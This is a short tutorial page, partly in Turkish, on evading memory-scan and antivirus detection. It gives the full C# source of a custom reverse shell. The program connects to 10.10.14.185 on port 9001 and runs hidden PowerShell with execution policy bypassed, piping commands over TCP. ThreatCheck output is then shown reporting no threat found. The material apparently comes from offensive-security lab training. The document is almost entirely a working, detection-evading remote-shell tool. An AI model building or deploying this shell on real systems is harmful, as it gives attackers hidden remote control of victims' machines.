# Dynamic Analysis

## Scenario

Belleğe kopyalanan payload gizli değildir. Bellek taraması tehdidi tespit edebilir. Korumayı atlatmak için özel bir kod yazılabilir.

## Case Study

* Console App (.NET Framework 4.7.2)
* Release, x64
* DynamicAnalysis.sln

## Custom Reverse Shell

```cs title="Program.cs" linenums="1"
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;

namespace DynamicAnalysis
{
    internal class Program
    {
        private static StreamWriter streamWriter;

        private static void Main(string[] args)
        {
            try
            {
                TcpClient client = new TcpClient();
                client.Connect("10.10.14.185", 9001);

                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                Process process = new Process();
                process.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                process.StartInfo.Arguments = "-ExecutionPolicy Bypass -NoLogo";
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
                process.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    process.StandardInput.WriteLine(userInput);
                }

                process.WaitForExit();
                client.Close();
            }
            catch (Exception) { }
        }

        private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
    }
}
```

## Analyzing

```pwsh
PS C:\Users\Administrator> C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f C:\Tools\DynamicAnalysis\DynamicAnalysis\bin\x64\Release\DynamicAnalysis.exe
```

```output title="Output"
[+] No threat found!
```
